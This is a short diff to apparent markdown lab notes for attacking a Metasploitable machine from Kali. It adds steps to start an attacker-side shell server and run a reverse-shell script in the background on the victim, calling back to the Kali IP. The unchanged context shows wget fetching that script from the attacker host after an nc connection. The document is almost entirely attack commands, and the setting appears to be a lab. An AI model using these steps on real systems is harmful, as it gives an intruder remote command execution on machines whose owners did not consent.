@@ -46,3 +46,11 @@ pass invalid
 
 - wget the file from metasploitable after connecting with nc
 ```bash wget <Kali IP>:8080/reverseShell.py```
+
+- start the shellServer on the attacker
+```bash python3 shellServer.py```
+
+- start the reverseShell on the victim in the background
+```bash python reverseShell.py <Kali IP address> &```
+
+- execute commands on attacker. voila!
